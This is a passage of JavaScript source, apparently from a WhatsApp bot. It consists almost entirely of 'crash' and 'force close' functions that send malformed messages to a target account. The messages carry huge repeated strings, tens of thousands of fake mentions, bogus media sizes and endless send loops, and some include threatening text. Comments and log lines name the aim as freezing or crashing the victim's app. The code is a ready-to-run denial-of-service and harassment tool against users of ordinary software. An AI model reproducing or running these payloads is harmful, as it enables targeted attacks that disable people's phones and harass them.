⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net", // Klo kurang ganti ke target
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    }

    await conn.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    })

    console.log(chalk.red("Send Bug Crash"))
  } catch (err) {
    console.error(err)
  }
}
async function Truenullv4(conn, target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await conn.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "SV SETTO", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await conn.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await conn.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}
function greeting() {
let time = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" })
let h = new Date(time).getHours()
if (h < 4) return "🌌 Good Night"
if (h < 11) return "🌅 Good Morning"
if (h < 15) return "☀️ Good Afternoon"
if (h < 18) return "🌇 Good Evening"
return "🌙 Good Night"
}
async function TesxDex(target) {
  await conn.relayMessage("status@broadcast", {
    ephemeralMessage: {
          message: {
            sendPaymentMessage: {
              noteMessage: {
                extendedTextMessage: {
                  text: "By : TsxDex👀!!",
                  matchedText: "https://t.me/",
                  description: "!.",
                  title: "",
                  paymentLinkMetadata: {
                    button: { displayText: "\u0000" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(70000) }
              }
            }
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
}
// Crash Home Invis 100%
async function TsxDex(target) { 
    const msg = generateWAMessageFromContent(
      target,
      {
        ephemeralMessage: {
          message: {
            sendPaymentMessage: {
              noteMessage: {
                extendedTextMessage: {
                  text: "By : KiyuruCrasher",
                  matchedText: "https://t.me/",
                  description: "!.",
                  title: "",
                  paymentLinkMetadata: {
                    button: { displayText: "\x30" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(70000) }
                  }
                }
              }
            }
          }
        }
      },
      {}
    )

    await conn.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: null, participant: { jid: target } }
    )
}
//FC INVIS NEW
async function fcv2(target) {
    try {
        const memeksg = {
            "stickerMessage": {
                "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                "mimetype": "image/webp",
                "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                "fileLength": "10610",
                "mediaKeyTimestamp": "1775044724",
                "isAnimated": false,
                "stickerSentTs": "1775178503000",
                "isAvatar": false,
                "isAiSticker": false,
                "isLottie": false,
                "contextInfo": {
                    "mentionedJid": [
                        "0@s.whatsapp.net",
                        "13135550002@s.whatsapp.net",
                        ...Array.from({ length: 1898 }, () => 
                            `1${Math.floor(Math.random() * 500000000)}@s.whatsapp.net`
                        )
                    ]
                }
            }
        };
        
        const msg = await generateWAMessageFromContent(target, memeksg, {});
        
        await conn.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, {
            participant: { jid: target }
        });
    } catch (err) {
        console.error(err);
    }
}
async function ForcloseOneMSGV2(conn, target) {
  try {
    let msg1 = {
      extendedTextMessage: {
        text: "🩸 Ş€ŦŦØ Ø₣₣ƗĆƗΔŁ?\nŴΔŇŦ ŦØ ҜƗŁŁ ¥ØỮ",
        contextInfo: {
          participant: target,
          stanzaId: conn.user.id,
          mentionedJid: ["13135550002@s.whatsapp.net"],
          forwardingScore: 98279,
          isForwarded: true
        }
      }
    };

    await conn.relayMessage(target, msg1, {
      participant: { jid: target },
      messageId: conn.generateMessageTag()
    });

    let loop = 0;
    while (true) {
      let msg2 = {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          isAnimated: false,
          stickerSentTs: "1775178503000",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      };

      const generate = await generateWAMessageFromContent(target, msg2, {});
      
      await conn.relayMessage(target, {
        groupStatusMessageV2: {
          message: generate.message
        }
      }, {
        participant: { jid: target },
        messageId: conn.generateMessageTag()
      });
      
      // Delay 
      await new Promise(resolve => setTimeout(resolve, 970));
      
      // msg3
      const msg3 = {
        interactiveResponseMessage: {
          body: {
            text: "Yatim Idiot",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "cta_call",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () => 
                `1${Math.floor(Math.random() * 5000000000)}@s.whatsapp.net`
              )
            ],
            forwardingScore: 98279,
            isForwarded: true,
            participant: target,
            remoteJid: target
          }
        }
      };
      
      const generate3 = await generateWAMessageFromContent(target, msg3, {});
      
      await conn.relayMessage(target, {
        groupStatusMessageV2: {
          message: generate3.message
        }
      }, {
        participant: { jid: target },
        messageId: conn.generateMessageTag()
      });
      
      loop++;
      console.log(`CrashOneMessage sent to ${target}`);
    }

    console.log("Successfully Send Crash One MSG");
  } catch (err) {
    console.error(err);
  }
}
async function xCursedFC(conn, jid) {
  for (var i = 0; i < 1000; i++) {
    await conn.relayMessage(jid, {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: 1775044724,
            stickerSentTs: "1775044724091"
           }
         }
       }
    }, {
      messageId: null,
      participant: {
        jid: jid
      }
    });
    await new Promise((r) => setTimeout(r, 1500));
  }
}
async function videoblank(target) {
  try {
    const etc = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        videoMessage: {
  "url": "https://mmg.whatsapp.net/v/t62.7161-24/31860914_1221044585990495_5437728845981251034_n.enc?ccb=11-4&oh=01_Q5Aa1wGl7j1DPwvBNS2cZuzSDCCxAa7RmH_twCmJ5236iq-4LQ&oe=68841516&_nc_sid=5e03e0&mms3=true",
  "mimetype": "video/mp4",
  "caption": "⩟⬦𪲁 ͤMutanoX-" + "ြ".repeat(90000),
  "fileSha256": "qHP6FmeT5jKQCvooW1kVYi4rAlN3+S3Bzjn5hntK4lw=",
  "fileLength": "549755813888000",
  "seconds": 549755813888000,
  "mediaKey": "tW71ApWmS0+gs4dl62ggzWcVbppgEKX5PpMt4aile0A=",
  "height": 1024,
  "width": 576,
  "fileEncSha256": "wJWLqMBTBN/zkcJ4QacETKzhGpUSBy2Qz00zZtc/9B8=",
  "directPath": "/v/t62.7161-24/31860914_1221044585990495_5437728845981251034_n.enc?ccb=11-4&oh=01_Q5Aa1wGl7j1DPwvBNS2cZuzSDCCxAa7RmH_twCmJ5236iq-4LQ&oe=68841516&_nc_sid=5e03e0",
  "mediaKeyTimestamp": "1750907489",
          gifPlayback: false,
        },
      }),
      { userJid: target, quoted: m }
    );
    await conn.relayMessage(target, etc.message, {
      messageId: etc.key.id,
    });

    console.log(chalk.green.bold("Freeze Video Sending to" + target));

  } catch (error) {
  }
}
async function FcXDelay(target, mention) {
let bokepFc = JSON.stringify({
status: true,
criador: "ForceClose",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});

let bokepFcV2 = JSON.stringify({
status: true,
criador: "ForceClose",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: " ",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".SkyzoDevoper",
                                    title: "gtau",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});
const contextInfo = {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "LAMPU KAKA😂",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
]
}
}
}
}
};

await conn.relayMessage(target, messagePayload, { participant: { jid: target } });
await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await conn.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
async function BlankXUi(conn, target) {
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  try {
    const msg1 = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "666@newsletter",
            newsletterName: "꧔".repeat(10000) + "\u0000".repeat(10000),
            caption: "\u0000".repeat(20000) + "ោ៝".repeat(60000),
            inviteExpiration: Date.now() + 9999999999
          }
        }
      }
    };

    await conn.relayMessage(target, msg1.message, {
      messageId: conngenerateMessageTag(),
      userJid: target
    });

    await sleep(100);

    const msg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(2500) + "ោ៝".repeat(3000)
                },
                {
                  name: "camera_permission_request",
                  buttonParamsJson: "ោ៝".repeat(4000)
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(3000)
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    status: true,
